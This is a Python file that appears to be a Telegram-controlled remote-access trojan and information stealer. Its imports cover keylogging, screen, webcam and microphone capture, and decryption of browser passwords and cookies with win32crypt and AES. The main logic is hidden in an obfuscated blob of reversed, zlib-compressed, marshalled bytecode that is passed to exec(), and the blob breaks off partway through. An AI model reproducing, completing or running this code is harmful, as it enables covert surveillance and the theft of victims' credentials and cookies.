import telebot
import os
import random
import pyttsx3
import pyautogui
import cv2
import json
import ctypes
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import time
import stat
import pyaudio
import wave
import browser_cookie3
import numpy as np
import shutil
from pynput import keyboard
from datetime import datetime, timedelta
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)(b'\xa6\x9f\x8d\xd5\x00\x00\x00\x04r\x04k\\\x01\x00\x00\xf5\x04k[\x06\x00\x00\xf3\x04kZ\n\x00\x00\xf0a\x81\x04\x00\xd9\x01\x01\x01\x03\xf0\x00\x00\x00\x1fs\x00\x00\x00\x01\x00\x00\x00\x06r>eludom<\x08\xda>x<\x03\xda\x00\x00\x00\x00\xf3\x00\xa9_\x01\xdacexe\x04\xda\x02)Nx\x9c}\x9aK\xaf\x9d\xd7Y\xc7\xf7\xf1\x85\x96\x00R\x982\xaa*@\x98f\xb0\xee\x17)\x8a\xb4\x9eu\x91\xeaA\x85\x1a:\xa2`9\x89\x95D\xd8\xc4\xd8iU(\x12\xfd\x10 1f\x86\xc4\x80\x0f\xc2 \x96\x91"\xce7`V)b\x0c\xbf\xff\x0e\t\x11\x95p\x9bc\x9fs\xf6~\xdf\xb5\x9e\xe7\xff\xfc/\xeb\xdd\xef_\xbe\xf1\xe7\xfe\xff\xfc\xfd\xc5\xef\xf3\xe5\xef/\xef^~\xe7\xf2\xe2\xf2\xe3\x9b\xef^~|\xf9\xee\xe5\xdd\x9b|\xf3\xe5\xaf\xbf\xfa\xfb;\x97\x0f\xef<\xb8\xfb\xfe\xcd7\xae\xf0\x06\xff\xdd\xd5\x15\xfe\xf1z\x85?\xf9\xfaw\xff\xfb\xee\x1f\xde\xbd\xfc\xca\x9fo\xbc\xee\xce\xd7\xaf\xbb\xff\xff\xbe\xee\xee\xd7\xaf\xfb\xd6\xaf\xbe\xeeG\xac\x9d\xff\xdd\x0bw\xef\x7fc\xbd\xff\xf7\xef\xdf\xbd<\xb8\xff\x83\xdbo={\xfc\xe2\xe5G\x8f\x9f\xde\xde\xfb\xeb\xa7\x1f\xbfw\xfbk\xef=~\xf9\xa4\xa4\xff\xf8/\xfe<\xb8w\xfb\xc6\xa3G\x1f?{\xfe\xc9\x8bO\x1f=\xba\xbd\xff\xf4\x93\xc7\x1f\xbc\xbc}\xe3\x83\'\xef\x7f\xf2\xec\xf9\x8b\'/_\xde\xfe\xfa{\xbe\xe8\xdb\x0f\x9e<\xb8\xb9\xbd\xf3\xe8\xd1K]\xfa;\xb7w\xdf\xfe\xd9;\xb7\xdf~\xfb\xe9\xe3g\xef}\xf0\xf8\x9d\x17\xbf\xc9\x0f\xf5\x8b\x97\xc6\x97_\\\xfe\xee\x8d\x7f\xe8\xaf\xdf\xfc\xbd\xcf\xdf\xfc\xde\xab7\xbf\xf7\xcf\x0f\xff\xe5\xa7\xaf\xdfz\xe7\xf3\xb7\xbe\xff\xea\xad\xef\xff\xeb\x1f~\xf6\xa3?}\xfd\xf0\xcf>\x7f\xf8\xd1\xab\x87\x1f}\xf6\xf1\x9f\xbfz\xfa\xfc\xb3\xbfx\xfe\xd9\xd3\xe7\xaf>\xfe\xcb\xd7\x0f_\xbc~\xeb\xe5\xbf\xbd\xf9\xe9\x17Z\xfc\xcb?zp\xb9l\xbfw/\xceEw\xce\x8a~\x1f;\xdb\xf6\xde\xe7\x1c\xdb=\x9eS\xbf\xfa\xee\xa46\xfb9\xb9\xd6\xb5&/\xae\xb3\xce\xa8\x7f\xd5j]o\x8a\xc7\xf2\x0e\xa7\x9fYO\xaf\xc3\x9f\xc9\x9b\xdd\xd9\xa7\xe5\xba\xfa>\xa3\x07]\xa7v\xbf\xbb\xde\xb5\x86\xaen\xdc\xb0\x9e\x90y\xdd\x89\xfc\x8ew\x9d\x1c{\xe3\xef1\xce.\xeb\xd4\xe3Ogy\xe7\x84:\xcb\xe6\xf7\xf1\xb4\xeb5\xecx\xae|\xb8\x8e\x99\x0f)\xb9\x9e\x82\x9fZ\xa7+\xf5\xac\xec\x93\xb5\xdd\xaak)\xd7\xd2G\x1a\x96\x82\xf3>\xef\xed]\x1fs\xa7b\xde\xdb.\xcd\x05Wk\xf6%9\x17B\x8c\xa9\xf2\xeb\xda\x16W\xde=\x94\x93\xeaJ\xa9\x96\x9a\xf68-\xf6\x12\xda\xf0\xa1\x85\x99\xc2\xf61M-o\xee8\xf2\xe9\xa5g\xefg\x99\xad\x8f8\xc6\xd0\xde\xcf\x88\xe5dc\xa7\xe5\xf0..}\\Lfu\xb7szk\xb3F\xae\xb2\xe7\xaa%\xa7\xc1\xb2\xa7\xcd\x12\x8a\xcf\x99\xe2\xf5\xc9\xf5\xda\xf4*\xb1\xc5t\xf2\x08\xcdB\xa8g\xec\xe9\xa3[iW\xd6\x19]\xef\xf58\xb3t\xce\xf6e\xcd\xad7\x94\xbd\xe6`\x7f\xa6\xb7\xb5\xb6}\x1b3T?\xf6(To\xed\x9a\xda\xde.x~9V\xc9\xdeb\xaca\xaf=\x9b\xcb\'\xf8\xe0\xd7X\xbd\xd5\xac-\x9c\xc2]\xb7\x1d7\xfa^\xf5\x1c\xe7Rk\xb4\x9b\x16{W\xf2I#p\xa3^|M}l\x9b\xbb\xc6\xb4"8X\xd4\xaa\xf78\xcdScn6\x03\xd56\x9f\xca\nv\xbaOnU\xb6\x1ch\xc6\xcemR\xf8\x04\x1e\xd2a\xad\xb9\xb0_\x9b>\x9cD\x13\x967G\x01{\xdfT\xd5\x01\'\xd7\xe9]\xdb\'\xd23;\xcdJOq\x86LI\xe6\xac\xde\xbbU\xce\xa8\xc1uv\x1aS\x8c\x8be\x86\xbcf<\xde2x/\xde\xa5\x99\xf9\xa5Q\x15?g\xdb\x06\xe4bn4c6^\x1c\x9dk6CO5\x85\xde\xfd\\\xc7\xa5L\xe3\x18\x91\xea\x1b8\x9a\x93\x06\xd7Uv\x0e1\x9f\xd6\x85\x1d\xcb\x00\x91Q\xc8\x03PE 6\x12\xe8i)\x8e\x18\xd9\x91\xab)\x97\x06\xda\x98\x1c\x90\xb4zv;\xc68\x17e=\x85*\xc5\x92c\x08\x99\xd2[\xa1%\xf5\xe4B\xcdA\xe6^.\x8d\xed\xbbK\x0b\xc4m\xaa\xc1\x16\x1d\x85\xf1\xbd\x8fL%\x87K>T\x97\x83P\x14:\xa8\x9e~y@\xcd\x0f;\x18i\xec\xc6|\xeb\xd4\x85\xca\x02\x9b\xe2\x8b\xd5:\xbd\x8b\x058\xec\x11C,\xa9\x15\xb0\x14\r\xc8n0cs\x86a\x16l\xad\x00(J\xe0vc\x83\x10_z\xb3\x15\x1b\xdd[m/x\xa3\xb8Y\xb2\xf9Q\xe2\xc9\xc7\nS\xb6{\x0bk\xd0\xf7\x99\x1d\xb5b\x00z\x0c\x8e\xa1l)5\xf6<G`\x9cV\xa7\x873\xe5\xc0j\x81\x9fF\xce\x82K\xb59_w,}\xb3b\x03}\x83\xaf\x0b\xee\t\'z\xd6\xd2\xda\x9a\xae\xb4\t\xce\xb2o\xc7\x1cM\x03\xf1\xd5\xc7\xc8\x0b\x1bU,}\x9d\x92\x87/\xd1\xd3\xf4\xdd\xcd\x1c\xf5\r\xb3\xef]{\xe6-\xa1\x07+\xd5\xd1\xcc0Z\xacy\xc53-\x81\xda\x10J\xcc\x94\xc8\x8c\xee\xf9\xc1\xb8\xa6\xee\xaa\x1bu\xf0\xedi\xb0da\xef\xd3\xb5\xd3\xad\xceMW\x02\x80\x03\\t\x84f0\xab\xdd\x98 \xc7\x85\x06`\xb3\x1aF\xc9\xf4-6\x0f\xc1\xf1\x8bqm\xe8.\x91\xa1\xf4\x94\xe6x\x07L\x92/E\xa0\x1e\x81\x12\x9c\xedbH\x95\xb1\x99\xac5y6\x0c\x8f\x85\x00%[w;\xc5V\x02\x10r\xad\x9f\xe8\x86\xcf\\!\xb7\x116\x18\x98\xab\xc7h\x11\xc4\xd2P\xa8\xbd\x17~_R*\xbe\x19#\xc3\xf8\x19e*s\xae\xe4\xca\x8cV\xf9\x12\x16ef\xe5y\xee\xa2-\xc7]a\xb7H\x81\xa1\x81\x11\x96\x83\xc1C\x1e}\xb5\x13bM6R\xa0A,\xb2uj6\x017;M\xacN\xd4\xe5\x17,\x0c\x0c\x17\x98\x9ai\xe4\x14y!\xb4\xbd`a\xe6\x9frB\xfc\xe0r\xd7\x99\x16\xadr\x8cWM\xce\xf6I3\xc03\x1ex\x80>\'\xb2\xde\t\x1d\x19\xc0\xb9\x95\xc9\xce\x99}\x084\xb4e{\xc5`\xea\xf9\x04P5F\xdf-\xac\x98Q\x8cj!\r\xd1\xb5\xef\xc7\x0f\x86\x05Zf23\xaaT\xa9\xfc<1l\xee\x98\x97\xa3B\x8dKt\xa0=\xcd\xa9\xa9%\x88\xb2a\x99\xdcK\xd64P\x8a\x02]\x1ah\x84\xbd\xd0\xa8\xce\xe4\xb0\x07x\xaa\xb1\xd2\tc\xc4\xb6B\x87\x17N\xb4\xe63\xa0\x85\xb1\xda\xdc\x87\xebWg\\\x9c\xff\x07.\x08\xbe\xd3p\'\xd1XOi\xe0\x822\x8fcf+\x04\x03\xc1m\x97\xd2`\xbdP~\xc8[\xed=\x9a\xe8\n\xa7\xb0\xc7\x1a\x90\xc4\x02\xdd\x83\xe5P\n\x8c\xdd#\x1c7x\xb3\xe5\xdc\xe1\x8c\xc3\xcc\xb0\x8e\xde\x97\xca\xbe\xce\x92\x8ex\xaa\xc2\xc8:\x1a\xb3;*\x9c\xa3!\r\x95a\xdd\xba\x19pM\xadk\xeeS\x0bpP(i@}\xb3\xf3\x8a\x81\x9a\xd6\xd2*\xdd\x9d\x1ex\xa3\xc8P\x84O\x8c\xf4\x96\xa0\xc2G\x00\xad\'\x14;f\xaef\x06\x1d\xf0w\xe5\x9e\\\x8bz!]\x93\xb6\xfa\xd5\xc0&l\x03\x8b6\x8a\x97\x07r\xd5\xc0Kk\xacyq\xe7\xd8\x1a\xa4\xbd\x919cs\xfd\x04\xc0\xda\xd1b\xfaa\r=\x16\x01i> +f\xbcn4\x7f9\xe6y;\xd0\xefa\xaet\x86CB`v\xa8\xa1v\x08\xc2s/\xbeCV#\xbc\x92\xcb8\xb6 \x19\xd7\x10M$0\xb0\x7f`*xe:\xc8\xfc\xc1\xebL\xb2c\xd3\x14v\xd8\xe0f\xa3\xb1\xb7\xc5\xacu\xe6\xde\xed5\xfcnt\xfb\xb4\xda \x1f&\x00\xea\xdbn\xfa\r\xffW\xe6\x1b\x11\x84k\xb3\x0f9\xe1]h\x02T\x84#\xe1\x8ehKN\xdc\xc5\xa7\xb3\x03\xe3\xe4\xd8\xdel\xab8\xe3\xbf\xb9|\x80\x9a\x8b\x06\xb2\xc1=\xdd\xc7%r8;\x82#\xc7\x00\xe3Gj\x054\x81ex\x9fP\x1a\x94\xbd\x7f9\xa9\xcc\x14<\x10;w\xdb\x88\xf6\xa2it/\xf5\xe9B\xa4D\x98\xa5\x02\xdd\xf4UX\xf2v\xf0#mc\x93~c\x1e\xb4\xb6\xd1\x11\x86\xec\xb1;\xd9x\xd7\xb0\x8d\x8a\x87\xce\x00E\x9c\x06\x96\x8a\xfb\x87<G/5 \xf6q!A\xa0s\xa7le\xd2\xe9\x85\xb2z8\xb6T\x88\x1b,v\xae\xcb\xab\xe8K\x83{\xa1\xc9\x11rL\xe9:K\xf0$\x0b\xeeu\xc3\x95\x01}6\xe4\x8a\xa24 \x86(,dhA;X\xab\xd4\xa8\x9f\x15\x80\x02y\x02\xe4\xe6\xd0+\x833\x10\x91\x00Ck]\x1e!A\xa4A\xc8H\x0c\xe4@U\x97C\x1c\xdb\xc6{&&9d`\x87\xccq\x01\x06\x95\x01\xca\x81\x0b.\xe6.j\xbc\x90\x0c\x88\x1fy\x00+\xb6|\xaf`\x13=e\xbc\x06jGi2>\x05\xe6\xc1\xfb\x1dL\xad3\x99XO\r\xf1C\x15\x07\x02\x9f\x03\xb3\xe1a%\xbc\xa6+\x85\xed!{\xf0\x90G\xc0\x98\x18 /\x87\x8c\xbba1\xce\xa7\xeb\x1e\xf3B\xc0\xfb\x10\x04\x06\x10\x84-d\x80\x18\xde\x89\xebq\x88\xa9\x83\x8c\x1a\xde\x1a\xd2\xa00\xa0\x06\x0b\x82\x132\x90\xbax\x1d\xad\x86\x16+?\x84\xad\x8a\x04\x8b\x15\x95\x82\xbb\xed\xcc\x08\xff\xcc}\x02 \x98\xa2AO\xa8\x06m\x11\x03S\x8c\x04r\x0c\x9f\xca\x10\xca\xc6`\x86,\xee\x05\xf5\xc2?\xf0*^\x07_\xb2\x013\xde\xac0zX\x0f\xec\xfb\xa6\xed\xc9e\x8c\xe3\xc0\x1f\xa2X\x14\x03\x91\x81, \xc6X\'M0\xa8UV$9\xb2\x82l%\xa0\t\x10\x9c\x9c5\xfc\x08\xa2\xb4\x9dQ\xa3+\x07r\xac\x0c\x0b\xb3\x1a`\x8eh\x19\xb6\xda\xad@\xac\xad\xf49\'\xbe\x02\xca\x00\x85p%\xf6\x05r8%\xc5\xbaDJ\x1e\xf7P\xa8\x1b~R\x18\xcc\x15\xba\x87w\xf8Q\x0c\xbd\xc0?\x83\xceL\x90\x1c\xaba\xfc%\x94\x98F\xa8$\xaa\xac\xd7Z\\\xc7\r\xd8E?1\x04A,\x81})@\rO\xc7\x1cF\xb1~Op/\xfa\x9d\xb3\x07H\x0ez]\x0b`\x1b\xc3\x8dK\xaeL\x05\x94Cb\xea\xb8\xc0\x81R`p\xf0\xdc\x07\xb8\x03Z\xa8\x15\xe40\x9c\x14\x05\xe2i(N\xdc`\xdc\xe3T4\xc7\x88\xd9\xd4\xe6\xe0\x01|\xbf\x13U\x9e\x0c3\x1a,\xab<\x80i\x01\x02h\r\x0eg\xd6L\x10H\x99\x81\xee8\x14b\x12\xa4Y\xe8P@\xb8\xa0\x07\nZcG\xb4I\x0bm\x16V3\xe9E\x01c\xdd{\x84W\x14\x8d\xa9\xc8\x83\xf9n\xc2\x1cS\x8a}\x87z\x9c\xa8\xbe2\x0c\xd2\x06X\x86\x0e\xa3\xa2\xd8\x05*3F\x81]y\x9d<4,\xb0S\x1bWo\xaea\x05\x83\xa4*\xac\xc9N\xb8\x01\xdc\x1aCB\xf3\xb0\x01`E\xd2\r\xecq\x07\x8c\x1cc\xe6\x1a\x99\xc8\x1d\x99\\^w\xaeC\xd9 \r\xbc\xc7\x08\x8e\xb1.\'\x92\x18\xb8\xea k\xe0--\xe2\xb1s\xf5\x87\x8c\xc6\xc5b\xeeC\xb4Q\xa2\xf4\x1c\xd5\x97h\xe2\\p\x8d\x11\xce\xc8\xa1G\xb8\x9e\x14\x02\xc1V\x92+.\x93M\xc0\x01u\x1c\xf4\x98D\x82\xd5\x00\x13x\xbb.\x13\x95:\xed\x08\xd8N\xfc\xbf\xf8\xb3\x8d\x08\xd7\x02w.\x86~l\xd2&\xbb\xe1R\x98H\xde\xbe\xb0]\xce\xc9\r\xc1\xf9\xcc\xb8\x82a\xc4\xbf\x15\xe0\xe9\x9d\x04\xce\x08\x89\xac\x1f\x13\\\xa9\x16\xdc\x0c\x9ai\x07mG7&9\xa0\xe5-"\xc0K\xaek\xa5p\x1f@\x16\xb5\x83\xcc\'{+\xc5\x80\x077\x82\xe0\x19^\x98x!\t]\x1a\x04e\x17Eo\\\x01\xceG\xcc\x00\xfc=s\xdfm\xd6] .H9\xf8\x94\xc8%P\x0b\x1bFk\x16\xa3!\xbf\xc7:\xc1$\xd3\t\xfd\xa1B\xa1\xc0\x98G\x0e\xbe\xe0x\x1a\xfc\x1a\x89\xf6\x95W\x05ReP\\i\x9a\x01\x90\x9d(IF\x83\x0f\x8b\xa19\x07\x19\xf3\x03N!6`\xde\x08i(\xe5"`\x93\xfe:\xe2\x83\xac\xf4\x85\x82u`?\xb0\xec\xbc\x11T\x01H11j\xd7\xb2\xd3\xecS\xcbmic\xcdq\xf7\xe4\x16\x926\xf6\x04\xc2Y\xe1l\x83\x83c@\xa2\x19\xde\xa0m\x0c\x80O\x83\x12u%\xf01\xa4\x98\xc6<\xa9J\xc3\xc1k\x1d\x91i\x85\xa7\x10\xb6\x84\x9b\x89\n\xadd\xea80I\\\x18\xb6f\x92\xdd\x96\x06\xc2\r:"\x00\x97\t\x93L\x14\xd0\x10\x14\x89!\x95\x1a\t`\x0e\x16\xb83\xef\x97\x19!\x8c\x97\x92!K\x11\xddao!\x01"\x07"\x06H\x08\xc5m\xc6\xcf\xc9\xcfS\xb4\\\xc5TE\'\x1e\x90\x02\x88p0+i6 \x94Lse\xe4\x08\xc6HA\xa0\xd4$\xa4\x01\xebA\xe9\xb0k8\xcbt_\x87\xf0! ,\x1b\'R4\xe2\x88\x88#t-\xa4H\x99\'N\xb0\xd7\xc9)8\xf4\xd8\x14\x8eE=\x83\xc6F$\xa7\x13\xd5!g9$\xe4\xca\xfaPD\xae\xe2\x7f\xfc\xd9D%a\xa0E\x11\xe9Xa\xaa\xe7`K\xb2!\x03\xea\xa08\xb2\xf1\xf4\x9a\x8e\xa2\xaah\x161\x8b\x1agL,\xc5jj\x11;\xc7\xa5\xe6\tQ+\xb0\xacF\x03\x95\xd3\x18\x99%\x93C\xfb\xb26\x8e\xd7\'\x05 \xfb\x98&tI\x86\x1aD\x93(\xc87N\xa1\x0e\n&0*j:*\xb0\xaa\xee6p\x0e\xf4\x83\t*\xf2\xc1\x94\x0f\xcf\x91\x94\xc0\xa9_Fi!\n\xc9\x9c\xaf\x91\xe0\x92\x9a\x02%\xba\xcd\xcf(\x03\x8a\xa0\x00\x00_\x80\xaajXY\x87,\xa1-m\x1f\x12z\x93\xae\xba,\'\x02O\xdb5%PO"-\x93\x03\x9dF\x8dD\xb5\x88\x05\xe1\x9d\xc5Q\x15|$\x1aJr\xe4=\xd8J\xac^\xca\xbb-y\x10l>\xf5\xb0\x83\x07\xc1\xa10\xafv\xf4\x12\xd8\'v\x9d+\x18\xd4\xe5\xa5u\x87\xa4_\x15v\xdb\xa6\x7f\x9e\xbc\xbe\xae$\x0c\x1cY\x1a\xc4\xc6\xf5\xe1 \x94\x18:\xe9\x93\x8b\xa4@\x93\x19N\x02\x08\xfe]m\xc1\x0b\x82\x02\x02\x19t\x8e\x16\xc1\x8bm!>\x91\x8b\x19d\xa4t\xefO\xaa\xd3\xc5CG\xc9kH0\xa90\x92J+m\xc0\xba\xb8\xc9d\'tz+\xb7\xf1~\x98\x9e\xde1\x10~"\x17\xa1m\x14\x8a\xc8\xa4\x83?\x1d8\xf1\x82\x01\x91\x93\xf6\xb0\x83X\x99\x1c\xe0\x9cpM\x02\x1d\x03D\xc7\x02\x03c\xa8$j\xdc\x15n\xec\xcbd\x88\xed\xd8\xc4\x13.\xdbN\xa3gr\x01\xf8\xcbFNj\x84\n\xde\x0e\xdc\x0c\x11\x07\xab,\x03V5\x86\x81\xa6\xccA\xfc\x83\x97\xa3\x1c;?\x00!H\x0et\xe9re\xe3\xda\x10\x1cR\xe3(\xf0\xea\x9e\x80\x06w\x91\x02,\xd0<\xa5\xcaX\xdc4a\x05\x1dr\xe0\xc1\x16\xf9\x01\xfe\x0c:\xf7\x80\xda\x0f\x83\x17\xb6\x12\xae\xa7\xf9\x01wH\xdcf\xae\x0eE\x1fV\x1bq\x84\x19\x97\xcbN{\x8b#\x08#\x04\xefEf-\xe27\xb4\r\x81c\x18tvB0Gh\xe6h2F\x84F\xac\x0e\xddL\xa4U\xa8j\xf1f\xa47!\xfa\xd4,(\xf8\xc9\xac5\xbcD\x04\r\xeb\xa0\x13\x198\x04j\x8f#cX\x07\xf7"\xde\x13\xec\xf7\x0caC\x02\x84s\xb9\x9f\xa050\x10Xj\xc4\x84+.\xe2+q\x083\x00\xa8\x82\x92S\xf1\xb2\xe4h\x0c\x14\x85_\xf5\xb2K\xc8\x8c\xdb\xf4c\xe1f\x13\x83\xc7\xc2\xf2\x96\xfb\x9e\xa8\x91/\xd4\x8b\x10\xd3E\xedpN\xab\x83L\x86/\xd4\xc9\x0e\x11Q\x9e\x9a\x01\x03\xff\xd2Z5\x99\x1d\xd8\xdc\xd0\x00\x0e\x8d1d\xf7\xe8\xab\'\xe5!\xe2\xda\xb6\xf7\xbc\x03#@\xc0\x96\xd1\x15\xd1gL\x05\xb3\xb0uZ\xc0\xfd\xa2\x16W\x81\x06f\x1e)\xb1\xaa\x99\xcc\x1b\x0b\xa4\xc3\x1e\x8c\x11\xf1"\xfa3\xe6\x8a\xb8\xb1\xdd\xc4\x8b\x8c\x8d\xce\rd\xce\x03.\xea0qX?\xef`\xe9\x89\x81\xcc\xe6\x12\x8b[\x90\x9c\xe3w\xa8\x1d\xbb\xed\x14\x1f9j\x18\x1b\xb4\x87\x82\xa2\xf1\xabv\x1ds)\xfa\x17\xca\xb1q\x96\xe6\xdb\x18\xc0\x8f\xbd\xd6\x02\xa2\xfa&\x1f\x12\xd5\xab\\B\xf2T\x1f\xd4P^\xd0\x81\xd6B7\xea\xde(\xde\xda\x14\xa9\xc26r\x0c\x11\xb3YL\xe7-0,9\xd8w\x1d\xb066\x05#-B\xb4\x1b\x84t^\x8aAs\x821\xb4\x94A\x0eu,\x9b\xf1\x8e\x93\xaaT\xccU\xd4Y\xe5\xac\xb0\xd7\xf4\x07\xc5,\x19K\x0f\xb7\x19\x12RF\xc6!*p*\xec13\xf8Y\xc2\x1b1\x87\xcc\xa7\xb3\xcd\xae(\x8f\x06A\xc8\x18\x08\xfc\xd1\xe26\x18\x8a\xac\x18\x18!&\x81\x02\xbeCW\x11\x13\x7fe\x86BAH\x13\x04\xbdL\x0fsw\x11~\x90\xe5D;\xd7\xe2bJHu\xc1\xd5\xd0-\xbex1\x87\x0b\xe2\x99\xd2E\xfc\x02\xc9\x8e\x12Vd\xa8\xf5AB\x0e\x0bf\xa6 \xd8\x91\x1a\xba\x06\xc10\x93\x83o\n\x99\x1c\x8d\x02Cx\xd5\xb0\x0e\xba\x04\xd1)\x1d\xb9\xb5\xc18|\xc6\xba7z%-\xba\x8a\x0f.\x82\n\x81\xb1\x9c5\x96\xe8EAy\xb2\xba\xb2\x82\x0c\x0f&V\x88\x1fYG%}\x05\xec\x0e\xe4\xc8Rc\x16\xe1\xe2\x98N1\xd9j|\x93/\xbc\x90L\x0b\xb0\tvL\x95\xce\x0f\x01\xa5A\x11\xd8y\xcfL\xba\x00Ou\xd3\xf9tS>\x87\x06\xa5\xa2\xd5g\xa8\x896\xc3#=\x1a\xa1\xca\xf3."U\x94\x83s^\xb7\xc1\xb5sq\xc4\x17\x8a"\xfa\x02\xf1\xa2\x11\xe1\xee\x04G\x991,\x12\xec3\xf8\x17\x8e\x83\xd8\x04\x11\xd22/n\x0b(j\x04\xba\x9d\x8a\x1d\x1d\x12.\t\t.\x1a\xae\xa3.x`\xf0\x8f] \xef\x03\x15E\x16LTc!\x01\x8a\x86=#F\x03\xe3Lb\xd3\xd1r+\x04\x93\xa8D\x9a\x9b1\x83\xd7\xb3Y\xd0\x8e\xc41\xaf\xec\x8cD\x8c\xac\xb0\xe7.\xbf\x0e\xce\x90\xf8E\xc6P\xf4\xed\xdby"\x88\x14\x01e\xc4\xb8!7\xe4\xb6\x88\x1f\x84r\x10J\x1c\xd0\xae1\x1f\xc2\x13\xd7V$8\xf0\x05>:\x17\x9d\xfc\x92\xc7\xd4\xe8\xc2\xc0dh\x8d[W\x91\x0es\x8eK\x1f\xa0]\xb9\x83_!ON\x04\xd0@\xf3>\xf1`u@#\xc5v\xae\xbb\x8ag\xc3\nz\x8d\xdc\xd0\xb8V\x16\x98=\x95]\xd4\x97[\xea\x98\x06!\x04\\\xe7\xe8d\x10\x94\x80\xfd\x06u\xad\x14\x90\x99\xc8\x98\xe1\xbc\x94\xea\xc2\xbc\x8e c5U\x07\xdc\xb6g8\x98\x06\xd6\x0c\xa5\x83g\xf8\xb9B\x17\xd5\xb9\xa2\xe7\n\x13_\x01\xce\xb9\xa1\x0e\x8f\xa2\x8e\x88]\x85\x03C\\\xa6\x073\x05s\x02\xa9\x05\x9dOT\xea\x12\x00\xbaNO\xc3"\xc8\x02`\xec9\xe9Fn\xf3zR\x0e\xb3\x15\x02\x02\x04\xec1~\x04\x06\x8a\x8dAE\x15\n\x9d\x1f\xd9\xae\xe7\t\xa5\xa1%\xce\x92\x9e?\x94\x99z&\xbf8\x19\xd38\xa5\xe3\x11\xcb\x0e,\xe1\xf3\xa1\xf3w(R\x0e\xb8\xe9\xf8[\x87 \x14\xa5\x9a\xca\xe1u\x18\xa8G#\x07[]\xf1\xafA\xdd3f\x88\x9aG\x04C\xa7_\xe0o\r\x82\x1c\x93H\x1a\x1c\xb0\x0b\xe5:i\x03j\x00\xac\x070Z\x06r\x1e\xae\x87U\xbd\x1a\x16\x81\x19\x87\xda\x9c\xca\x83\x90\xa1=\xa4>\xec\x17\xbe\x9d\xdcNn\x10\x97\xe1\xdb\xe1F\xd6\xb8\x05T\xf0;!f\x9c\xe4\xa4`\xa8-\xb8@\xba\x98\xb7#\x8d_\x11f\x8bC6}\x0e\xc2\xad\x0eW\t\x80\xect\x11!)\xa9\xa7\xa1\x85\x00\xc7\x0fAJ\xae\xa7z"s\xb2L\xb7\x95S\x16<\x8f/*\xb3`\xf7\x88X\x08-\x91\xff0\x82H:\xa3\xbf\x9bZ\xd1\xd5O\xe8\nwHW\xc9\x80pk\xda:\xae\xf0\xf3\x14=\x06\xc0\xce\x10n\xc8\x04\x0e\xa9\xc0\xc3\x10=u\xe2\xe6\x05W\xe2\xa5\xd7\x11/\x8aJ?Qa\x9fq\xd4\tut\xd7\x07\x8ar\xa3\x01\xc0.L\xbb\xb1\x11\xe4\x1aR\xd4\xbf\x02\xe1<Mr2z=\x9c\x873\x99j\x08\x8b\xee\x13\x86\xc3)\x81I:\xac\xd5\x90\x01D.\xeb\xfcMO\x16\xe0\x0c\xb6\x8d\x8f\xaeN\xc0\xa1\'\xd8a\xf2u\x859\xf4Ha\xe1\x9c\x8c\xbb\r\xa7\xe4\r{ ^\r\x81g\x90\x06\x17iC\x87\xf6\xb4s\xd5=\xe8+\xcb\x965\xefc\x0463\xc8\xdbh\\\x88\xc2F\x87\x00I\x1d&KF7\xb8\x9e\xcc7\xd6\x02AE4\x07\xafQ\xf0\xc4=c\xd2\t\x07\xb4VD\xe0\x14\xd0*^\x1eA\xc5\xebpY\xa8`\x12yu\x98\x86\xa5\xc4\x0f\xa3\xbb\xec\xc1\x90\x9d\xed\x94\xf1\xbdLl\xdf\x19\xd7"\xec\xb9\x8dA9\xe7p\xadM\x8c\x03\x190&\x9cFu\xc9\xa3p\x9a,\xe0\xba\x9ew6\x84\xa3\xc3W\xca\x8f\xeb0\xc84\x98\xe0\xc5\xa5`\xc1&\x90\xe0q\x8b\xce\xdb\xa9C\xa5\xfaL:J \xdc\xb3\x12=\xce2n|\xc53\xc4\x8d\xfa\x17\x89\x9c\x9c\x02\x86\x01\xe3\xc6\xc2tf.\x97\xd8\xb1\x8d8\xef>\x8e\x0e\xdb\x89\x02\x98\x1clY\xaa\x0b] Ba\xc5\xa9*4\xc5d\xb8\xd6\xf4\xc0H\x0fu\x15^\x9d8\x91\xc9\xc6\x1c!\xb6H\x8e\xd2R\xc0\xcd\x05\xa46\xb1I\xe8\x1c\x89[\xa1\x83?b[\x81\x89h&\xff\xa3f\xb6\x80J\xd6C-\xb9Of\x8fx\x86\xd9c\xd27\xe3\xa8\xa7\xab\x92X\x98\x15v\xd2\xc1\x0f\xf9\x84X\x95:w\xf4\xe4xkxU=0%\xbc!,\x0c\x18c\x83\xab\x87\xdb\x18\xael::\xc5\xa4"`G\x87\'r\xfd(\x99\x0bz:\x8b>\xe3\xc0\xa1 L\xcdL\x9a3/8\xf7cz\x14\xcc\xe8w\x82\xcf\xc1@\xea\x1f\x1d\x9d\x00\x919Ars\xf3s|\x0c8\xd5\xe3a,D\xa9\x90\x96&\t\x8d)\x89;\x9a!+\xe0$*\x82\x05\x08\x81\xee\xe1\x8d2\x9a[p\xe9\x1b\xa5\x19:\xa1 \xf8\xe7\xa8\'\xd6\xf8^\\\x01\xdeT\xf6ZVo\xc3\xc1\x15\xcf\x9d6\xd6\xb7Q\xd2\xa4\x87\x02S\xcf\xc5\x99=\xe0IB]\xb1\x16\x19\x9cSu\xc6\x87e\xd0S4 Q\xf1-\xa6\x13JO\xae\xd3(\xe3uf\x06\xcfU6\x11;\xc2\xf20=(] \xd1`VN\x93\xa1\xec\xd2S\x7f\xd6\xd2\xb3\x87A\xd6\'\x11\xe8\x90\r\xbcPJ\xac\xf2\x890\\\x16\x8f\xc8*\xea\xc4\x106\xc7\xf0\xe2\xb9\xd1\x9e\x06\xad1>Hu\x84\xab\xdb5\x00\xb6\xac\x00eHc,.\xe882\xb3\x0fBK]ea6\xdc&\x17\x19\xb6$\xe8)\xf8!\x98Pp\\\xc3\xd9z\xd6\r\xe3\xcb\\\xe9\xa3\x08{\xe8\x88\xd9t\x1aK\x16\\A\x8f\xb1\x17\xceP*\x99\x94\xed\xaa\xcc\nB\xdb\x82\xdeA\xd4E\xac\xf7:R\xf7lK\xb5\xcd`\xd9O~\xa8g|\xb8\x88\xa0\xf3\xceet$Fv\xd2\xd7\xd1\xe3h0j\xa5\xb45U\xec\xb4+\xf7Hz\xa6\x99=\x89tg\xe6\xba\x94\xca4\xe1"L\x87Y\x88\x01s1\xcfUn\xc84\xb4\x81\xe9\xc3\xd9\x11\x86HPU\xcfFP?\xc3Z\xe3\xd9\xc47@\xd1\xc9y\x02Q"\x80\xced\t\x9aXr\xf6d\xa4@_\xc0\x0f\xd0*p\x1eh\xc5\xd6\xf0m\x1d\x19\xd1\xe7\x06D\xbf\xb1\xc9\xe0E7h\x15\xe7s0Q\x8c\